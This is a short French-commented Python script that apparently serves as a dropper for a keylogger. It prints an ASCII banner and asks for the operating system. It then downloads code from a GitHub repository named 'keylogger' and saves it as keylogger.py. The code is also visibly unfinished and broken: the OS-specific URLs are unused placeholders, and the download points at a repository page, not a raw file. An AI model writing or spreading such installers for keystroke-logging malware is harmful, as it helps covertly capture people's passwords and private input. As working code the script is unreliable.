import time
import requests

#---------DÉBUT AFFICHAGE DU NOM-----------------------
def print_keylogger():
    keylogger_art = r"""
     _  __           _                                      
    | |/ /          | |                                     
    | ' / ___  _ __ | | ___  ___   __ _  __ _  ___ _ __ ___  
    |  < / _ \| '_ \| |/ _ \/ __| / _` |/ _` |/ _ \ '__/ _ \ 
    | . \ (_) | |_) | |  __/\__ \| (_| | (_| |  __/ | | (_) |
    |_|\_\___/| .__/|_|\___||___(_)__,_|\__, |\___|_|  \___/ 
             | |                        __/ |               
             |_|                       |___/                
    """

    for line in keylogger_art.splitlines():
        print(line)
        time.sleep(0.3)

print_keylogger()

#----------FIN AFFICHAGE DU NOM-------------------


#----------DÉBUT RÉCOLTE INFOS DES MACHINES----------------

systemeExploitation = int(input("Êtes-vous sur windows ou linux ? Tapez 1 pour windows ou 2 pour linux\n"))

while systemeExploitation!=1 and systemeExploitation!=2:
    systemeExploitation = int(input("Veuillez choisir 1 pour windows ou 2 pour linux"))

#mail = str(input("Veuillez écrire votre mail pour recevoir le fichier txt dessus : "))

if systemeExploitation==1:
    url="Pour Windows" #A changer
else:
    url="Linux" #A changer

#-----------FIN RÉCOLTE INFOS DES MACHINES---------------




#-----------DÉBUT INSTALLATION DU BON FICHIER---------------

def download_file(url, local_filename):
    try:
        # Envoyer la requête GET pour obtenir le fichier brut
        response = requests.get(url)
        response.raise_for_status()  # Vérifie si la requête a échoué

        # Sauvegarder le contenu dans un fichier local
        with open(local_filename, 'wb') as f:
            f.write(response.content)
        print(f"Fichier téléchargé avec succès sous le nom {local_filename}")
    except Exception as e:
        print(f"Erreur lors du téléchargement: {e}")

# Exemple d'utilisation
file_url = "https://github.com/ELREBEU/keylogger"
local_filename = "keylogger.py"

download_file(file_url, local_filename)

#----------FIN INSTALLATION DU BON FICHIER-----------------
